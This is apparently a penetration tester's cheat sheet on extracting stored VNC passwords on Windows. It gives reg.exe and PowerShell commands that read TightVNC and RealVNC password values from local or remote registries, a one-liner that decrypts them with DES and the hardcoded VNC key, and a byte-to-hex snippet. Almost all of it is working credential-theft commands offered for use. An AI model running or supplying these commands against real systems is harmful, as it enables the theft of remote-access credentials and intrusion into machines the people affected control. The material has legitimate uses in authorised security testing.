# Living off the Land

## 01 - TightVNC

### 1.1 - Command Prompt

```
C:\> reg.exe query [\\<IP>\]HKCU\Software\TigerVNC\WinVNC4 /v Password

C:\> reg.exe query [\\<IP>\]HKCU\SOFTWARE\TightVNC\Server" /v Password
```

Decode the hardcoded password.

```
$ basenc -d --base16 <<< "<hex_encoded_password" | openssl enc -provider legacy -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -C
```

### 1.2 - PowerShell

```powershell
PS C:\> Get-ItemProperty -Path "HKCU:\Software\TightVNC\Server"

PS C:\> $FormatEnumerationLimit = -1
Get-ItemProperty -Path Registry::HKLM\software\TightVNC\Server -Name ControlPassword
$password = 139, 16, 57, 246, 188, 35, 53, 209
ForEach ($hex in $password) {
[Convert]::ToString($hex, 16) }
```

## 02 - RealVNC

### 2.1 - Command Prompt

```
C:\> reg.exe query [\\<IP>\]HKCU\Software\ORL\WinVNC3\Password

C:\> reg.exe query [\\<IP>\]HKLM\SOFTWARE\RealVNC\WinVNC4 /v password

C:\> reg.exe query [\\<IP>\]HKLM\SOFTWARE\RealVNC\vncserver
```

### 2.2 - PowerShell

```
PS C:\> Get-ItemProperty -Path "HKCU:\Software\ORL\WinVNC3\Password"

PS C:\> Get-ItemProperty -Path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -Name password
```

---
## References

- [Pentestlab Blog: Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)